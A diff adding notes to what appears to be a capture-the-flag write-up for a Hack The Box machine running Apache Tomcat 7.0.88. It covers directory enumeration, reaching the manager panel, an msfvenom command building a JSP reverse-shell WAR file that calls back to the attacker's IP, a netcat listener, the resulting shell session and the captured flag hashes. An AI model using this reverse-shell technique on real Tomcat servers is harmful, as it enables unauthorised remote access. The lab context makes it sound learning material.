@@ -76,3 +76,43 @@ Port 8080 apache tomcat 7.0.88
 
 ```
 
+Apache Tomcat is listerning on 8080.
+
+Use Dirbuster to search for filepaths
+
+Two interesting returns are manager and host-manager
+
+Try accessing http://10.10.10.95/manager and auth is required.
+admin / admin does not work, but pressing cancel returns a page stating 
+
+```
+
+For example, to add the admin-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above. 
+
+```
+Authenticating to manager gives you the admin panel.
+In the panel there appears to be  way to upload war files.
+
+The URL https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/ describes a way to to create a msfvenom war file.
+
+
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.38 LPORT=1234 -f war > shell.war
+Payload size: 1091 bytes
+Final size of war file: 1091 bytes
+
+kali@kali:~/Documents/HTB/jerry$ nc -lvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.38] from jerry [10.10.10.95] 49192
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\apache-tomcat-7.0.88>type *.txt
+user.txt
+7004dbcef0f854e0fb401875f26ebd00
+
+root.txt
+04a8b36e1545a455393d067e772fe90e
+C:\Users\Administrator\Desktop\flags>
+
+
